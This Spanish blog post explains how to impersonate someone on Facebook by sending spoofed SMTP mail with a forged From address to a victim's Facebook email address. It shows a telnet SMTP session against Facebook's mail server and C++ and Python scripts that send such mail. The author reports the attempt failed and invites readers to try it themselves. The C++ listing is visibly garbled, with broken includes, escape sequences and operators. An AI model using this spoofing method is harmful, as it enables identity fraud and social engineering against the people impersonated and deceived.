---
author: alex
categories:
- seguridad
date: '2016-01-01'
lastmod: 2017-09-10T12:49:03+01:00
mainclass: articulos
url: /suplantacion-de-identidad-en-facebook/
tags:
- email spoofing
- seguridad
- smtp
- spoofing facebook
title: "Suplantación de identidad en Facebook"
---

Leyendo el blog de <a href="http://www.elladodelmal.com/" target="_blank">Chema Alonso</a> me he encontrado con una entrada interesante que, aunque no he logrado realizarla al 100% quiero compartirla con vosotros para que lo intente quien quiera.

El método consiste en conseguir 3 cosas:

- *La dirección de correo de la persona a suplantar.*
- *Dirección de correo de facebook de la persona a quién se va a engañar.*
- *Un sistema para enviar correos SMTP*

Los pasos a seguir podéis leerlos en la entrada de <a href="http://www.elladodelmal.com/2012/05/suplantacion-de-identidad-en-facebook.html" target="_blank">Chema: Suplantación de identidad en Facebook</a>

Voy a explicar lo que yo he hecho:

Al principio al establecer comunicación mediante telnet por el puerto 25 (el de SMTP) y escribrir los comandos siempre recibía el siguiente error:

```bash
550 5.6.0 Invalid header found (see RFC2822 section 3.6)
```

Tras buscar un poco el motivo descubrí que se debía a que me estaba saltando algunas cabeceras del protocolo, concretamente *From, To * y *Date.*

En resumen, todo el proceso queda como sigue:

<!--more--><!--ad-->

```bash
telnet smtpin.mx.facebook.com smtp
Trying 69.171.244.11...
Connected to smtpin.mx.facebook.com.
Escape character is '^]'.
220 smtpin.mx.facebook.com ESMTP
HELO client.facebook.com
250 smtpin.mx.facebook.com says HELO to xx.xxx.xxx.xx:xxxxx
MAIL from:
250 MAIL FROM accepted
RCPT to:
250 RCPT TO accepted
DATA
354 continue.  finished with "rn.rn"
From: xxxxx@xxxxx.xxx
To: xxxxxx@facebook.com
Subject: Test
Date: xxx, xx xxx xxxx xx:xx:xx -xxxx

This is an example
.
450 4.3.2 INT-T14 http://postmaster.facebook.com/response_codes?ip=xx.xxx.xx.x#int Server busy, try again later
Connection closed by foreign host.
```

Pero sigo recibiendo un error (*450 4.3.2 INT-T14 http://postmaster.facebook.com/response_codes?ip=xx.xxx.xx.x#int Server busy, try again later
Connection closed by foreign host*)

También probé con dos programas (sin éxito), uno en[ C++][1] y otro en [python][2] que encontré en stackoverflow:

```cpp
#include <iostream>
     #include <sys>
     #include <netinet>
     #include <netdb>
     #include <stdio>
     #include <string>
     using namespace std;
     #define HELO "HELO xxxxxx@xxxx.xxxxrn"
     #define DATA "DATArn"
     #define QUIT "QUITrn"

    //#define h_addr h_addr_list[0]
    //FILE *fin;
    int sock;
    struct sockaddr_in server;
    struct hostent *hp, *gethostbyname();
    char buf[BUFSIZ+1];
    int len;
    char *host_id="69.171.244.12";
    char *from_id="********";
    char *to_id="*******";
    char *sub="testmailrn";
    char wkstr[100]="hello how r urn";

    /*=====Send a string to the socket=====*/

    void send_socket(char *s)
    {
        write(sock,s,strlen(s));
        write(1,s,strlen(s));
        //printf("Client:%sn",s);
    }

    //=====Read a string from the socket=====*/

    void read_socket()
    {
        len = read(sock,buf,BUFSIZ);
        write(1,buf,len);
      //printf("Server:%sn",buf);
    }

    /*=====MAIN=====*/
    int main(int argc, char* argv[])
    {

    /*=====Create Socket=====*/
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock==-1)
    {
     perror("opening stream socket");
     return 1;
    }
    else
      cout < < "socket createdn";
    /*=====Verify host=====*/
    server.sin_family = AF_INET;
    hp = gethostbyname(host_id);
    if (hp==(struct hostent *) 0)
    {
     fprintf(stderr, "%s: unknown hostn", host_id);
     return 2;
    }

    /*=====Connect to port 25 on remote host=====*/
    memcpy((char *) &server.sin;_addr, (char *) hp->h_addr, hp->h_length);
    server.sin_port=htons(25); /* SMTP PORT */
    if (connect(sock, (struct sockaddr *) &server;, sizeof server)==-1)
    {
     perror("connecting stream socket");
     return 1;
    }
    else
      cout < < "Connectedn";
    /*=====Write some data then read some =====*/
    read_socket(); /* SMTP Server logon string */
    send_socket(HELO); /* introduce ourselves */
    read_socket(); /*Read reply */
    send_socket("MAIL FROM: ");
    send_socket(from_id);
    send_socket("rn");
    read_socket(); /* Sender OK */
    send_socket("VRFY ");
    send_socket(from_id);
    send_socket("rn");
    read_socket(); // Sender OK */
    send_socket("RCPT TO: "); /*Mail to*/
    send_socket(to_id);
    send_socket("rn");
    read_socket(); // Recipient OK*/
    send_socket(DATA);// body to follow*/
    send_socket("Subject: ");
    send_socket(sub);
    read_socket(); // Recipient OK*/
    send_socket(wkstr);
    send_socket(".rn");
    read_socket();
    send_socket(QUIT); /* quit */
    read_socket(); // log off */

    //=====Close socket and finish=====*/
    close(sock);
    return 0;
  }

```

La versión en python:

```python
#!/usr/bin/python

import smtplib
import sys
import os

sender = 'xxxxx@xxxxx.com'
receivers = ['xxxxx@facebook.com']

message = """From: From Person
To: To Person
Subject: SMTP e-mail test
This is a test e-mail message.
"""

try:
   smtpObj = smtplib.SMTP('69.171.244.12')
   smtpObj.sendmail(sender, receivers, message)
   print "Successfully sent email"
except Exception, exc:
   sys.exit( "mail failed; %s" % str(exc) ) # give a error message
```

Esto es todo, por más que lo he intentado no lo he logrado, si os animáis a probarlo y lo conseguís, agradecería que lo comentárais.

# Fuente: <a href="http://www.elladodelmal.com/2012/05/suplantacion-de-identidad-en-facebook.html" target="_blank">Elladodelmal</a>

 [1]: https://elbauldelprogramador.com/c/
 [2]: https://elbauldelprogramador.com/python
